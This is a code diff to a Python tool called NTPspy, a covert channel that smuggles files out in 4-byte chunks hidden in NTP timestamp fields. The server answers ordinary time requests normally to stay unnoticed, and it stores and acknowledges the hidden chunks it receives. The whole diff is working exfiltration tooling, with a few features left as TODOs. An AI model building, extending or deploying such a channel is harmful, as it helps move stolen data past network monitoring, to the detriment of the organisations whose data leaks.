@@ -1,3 +1,4 @@
+import re
 import socket
 import struct
 import argparse
@@ -88,8 +89,8 @@ class NTPpacket:
             self.transtime_frac
         )
 
-    def is_ntpspy(self):
-        return self.precision == NTPSPY_VERSION
+    def is_ntpspy(self, magic_number):
+        return self.rootdelay == magic_number
 
 class NTPspyMessage:
     def __init__(self, session_id=0, sequence_number=0, payload=0, opcode=0):
@@ -133,30 +134,31 @@ class NTPServer:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(("", self.port))
         if self.verbose:
-            print(f"NTPspy version {NTPSPY_VERSION} listening on port {self.port}, storing files in {self.storage_path}")
+            print(f"NTPspy version {NTPSPY_VERSION} listening on port {self.port}, storing files in {self.storage_path}, magic number: {self.magic_number}")
         
         try:
             while True:
                 data, addr = sock.recvfrom(48)
                 ntp_in = NTPpacket(data)
-                #request_magic_number = struct.unpack("!I", data[4:8])[0]
-                #is_ntpspy = request_magic_number == self.magic_number
 
-                request_type = "NTPspy" if ntp_in.is_ntpspy else "Standard"
+                request_type = "NTPspy" if ntp_in.is_ntpspy(self.magic_number) else "Standard"
                 if self.verbose:
                     print(f"{addr[0]}:Received request, type: {request_type}")
                 
-                if ntp_in.is_ntpspy:
-                    response = self.handle_ntpspy(data)
+                if ntp_in.is_ntpspy(self.magic_number):
+                    #print(vars(ntp_in))
+                    response = self.handle_ntpspy(ntp_in)
                 else:
                     response = self.handle_standard(ntp_in)
+                response.mode = 4  # server mode
                 
-                sock.sendto(response, addr)
+                sock.sendto(response.pack(), addr)
         except KeyboardInterrupt:
             print("Server shutting down...")
         finally:
             sock.close()
 
+    # mimic standard NTP server behavior for non-NTPspy datagrams
     def handle_standard(self, request):
 
         response = NTPpacket()
@@ -169,56 +171,27 @@ class NTPServer:
         
         return response
 
+    # handle incoming NTPspy messages
     def handle_ntpspy(self, ntp):
-        # extract ntp fields
-        # li_vn_mode, stratum, poll, precision, root_delay, root_dispersion, reference_id, \
-        # ref_timestamp_sec, ref_timestamp_frac, orig_timestamp_sec, orig_timestamp_frac, \
-        # recv_timestamp_sec, recv_timestamp_frac, trans_timestamp_sec, trans_timestamp_frac = struct.unpack("!B B B B I I I I I I I I I I I", data)
-        # li = (li_vn_mode >> 6) & 0x3
-        # vn = (li_vn_mode >> 3) & 0x7
-        # mode = li_vn_mode & 0x7
 
-        # opcode = poll
-        # session_id = reference_id
-        # sequence_number = ref_timestamp_frac
-        # payload = orig_timestamp_frac
-        # function = "query" if opcode == 0x0 else "transfer file"
-        message = NTPspyMessage().from_ntp(ntp)
+        message = NTPspyMessage()
+        message.from_ntp(ntp)
+        
         if self.verbose:
             print(f"Received request, type: NTPspy, function: {message.opcode}")
         
-        if opcode == 0x1:
-            filename = os.path.join(self.storage_path, f"{session_id}.dat")
-            with open(filename, "ab") as f:
-                f.write(payload.to_bytes(4, byteorder='big'))
-            if self.verbose:
-                print(f"Appended payload to file {filename}")
+        if message.opcode == 0:
+            response = self.handle_query(message)
+        elif message.opcode == 1:
+            response = self.handle_transfer(message)
+            
+        reply = response.to_ntp()
+        return reply
 
-        # regular NTP response with current time
-        recv_timestamp = time.time()
-        ntp_timestamp = int(recv_timestamp) + UNIX_TO_NTP
-        fractional = 0 # reserved 
-        root_delay = self.magic_number
-        precision = NTPSPY_VERSION
-        
-        # response = struct.pack(
-        #     "!B B B B 11I",
-        #     0x1C,  # LI=0, Version=3, Mode=4 (server)
-        #     15, opcode, precision,  # Stratum 15 = server mode, poll = opcode, precision = protocol version
-        #     root_delay, 0,  # root Delay, root dispersion
-        #     session_id,  # reference ID field
-        #     ref_timestamp_sec, ref_timestamp_frac,  # Reference Timestamp
-        #     orig_timestamp_sec, orig_timestamp_frac,  # Originate Timestamp
-        #     ntp_timestamp, fractional,  # Receive Timestamp
-        #     ntp_timestamp, fractional   # Transmit Timestamp
-        # )
-        response = NTPspyMessage()
-        if self.verbose:
-            print(f"Sent response, function: {function}, value: {precision}")
-        
-        return response
-
+    # identify ourselves as an NTPspy server
     def handle_query(self, message):
+        if self.verbose:
+            print("Responding to version probe")
         response = NTPspyMessage()
         response.opcode = 0x0
         response.session_id = 0
@@ -228,9 +201,40 @@ class NTPServer:
         response.status = 0
         response.magic = self.magic_number
         return response
+    
+    # processing incoming file transfer
     def handle_transfer(self, message):
-        pass
+        if self.verbose:
+            print("Received file transfer message")
+        response = NTPspyMessage()
+        if message.session_id == 0:
+            if self.verbose:
+                print("New file transfer session")
+            # TODO generate new session ID
+            # for now, send poison pill to abort transfer
+            response.opcode = message.opcode
+            response.status = 0x3
+            return response
+        else:
+            # process incoming file data
+            # filename = {storage_path}/{session_id}.dat
+            # offset = sequence_number * 4
+            # write payload to file at offset
+            if self.verbose:
+                print(f"Received data for session {hex(message.session_id)}, sequence: {message.sequence_number}, payload: {hex(message.payload)}")
+            filename = f"{self.storage_path}/{hex(message.session_id)}.dat"
+            # ensure file exists
+            if not os.path.exists(filename):
+                with open(filename, "wb") as f:
+                    pass
+            with open(filename, "r+b") as f:
+                f.seek(message.sequence_number * 4)
+                f.write(struct.pack("!I", message.payload))
 
+            # send ack
+            response = message
+            return response
+        
 class NTPClient:
     def __init__(self, args):
         self.server_ip = args.remote
@@ -276,12 +280,12 @@ class NTPClient:
         return precision == NTPSPY_VERSION
 
     def upload(self, remote, filename):
-        if not self.query_server():
+        if not self.query_server(remote):
             return
         
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         
-        with open(self.filename, "rb") as f:
+        with open(filename, "rb") as f:
             sequence_number = 0
             while True:
                 segment = f.read(4)
@@ -289,10 +293,11 @@ class NTPClient:
                     break
                 
                 # session ID to integer
-                session_id_int = int.from_bytes(self.session_id.encode(), 'big')
-                
+                #session_id_int = int.from_bytes(self.session_id.encode(), 'big')
+                session_id_int = int(self.session_id, 16)
                 # segment to integer
-                payload = int.from_bytes(segment, 'big')
+                #payload = int.from_bytes(segment, 'big')
+                payload = int(segment.hex(), 16)
                 
                 ntp_timestamp = int(time.time()) + UNIX_TO_NTP
                 fractional = 0  # Placeholder for now
@@ -304,19 +309,31 @@ class NTPClient:
                     self.magic_number, 0,  # Root Delay = magic number, Root Dispersion = reserved
                     session_id_int,  # Reference ID
                     ntp_timestamp, sequence_number,  # Reference Timestamp
-                    ntp_timestamp, payload,  # Originate Timestamp
+                    ntp_timestamp, fractional,  # Originate Timestamp
                     ntp_timestamp, fractional,  # Receive Timestamp
-                    ntp_timestamp, fractional   # Transmit Timestamp
+                    ntp_timestamp, payload   # Transmit Timestamp
                 )
                 
                 sock.sendto(request, (self.server_ip, self.port))
                 if self.verbose:
-                    print(f"Sent NTPspy packet to {self.server_ip}:{self.port}, sequence_number: {sequence_number}, payload: {payload}")
+                    print(f"Sent NTPspy packet to {self.server_ip}:{self.port}, session: {session_id_int} sequence_number: {sequence_number}, payload: {hex(payload)}")
                 
-                response, _ = sock.recvfrom(48)
+                reply, _ = sock.recvfrom(48)
+                response = NTPpacket(reply)
+                #print(vars(response))
+                if response.LI == 0x3:
+                    print("Fatal error, aborting transfer")
+                    break
                 if self.verbose:
                     print("Received NTP response")
-                
+                ack = NTPspyMessage()
+                ack.from_ntp(response)
+                if ack.sequence_number == sequence_number and ack.payload == payload:
+                    print(f"Received ACK for sequence number {sequence_number}")
+                else:
+                    print(f"ACK mismatch, expected {sequence_number}, got {ack.sequence_number}")
+                    # TODO retry up to max attempts
+                    break
                 sequence_number += 1
 
 if __name__ == "__main__":
@@ -334,7 +351,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
     if args.d:
-        if not (len(args.d) <= 8 and all(c in '0123456789abcdefABCDEF' for c in args.d) and int(args.d, 16) != 0):
+        if not (len(args.d) <= 8 and all(c in '0123456789abcdefABCDEF' for c in args.d)):
             parser.error("Session ID must be hex 1 - FFFFFFFF")
             sys.exit(1)
     if args.p:
@@ -355,4 +372,6 @@ if __name__ == "__main__":
         if args.q:
             client.query_server(args.remote)
         else:
-            client.upload(args.remote, args.filename)
+            print(f"Uploading {args.filename.name} to {args.remote}")
+            print(f"Session ID: {args.d}")
+            client.upload(args.remote, args.filename.name)
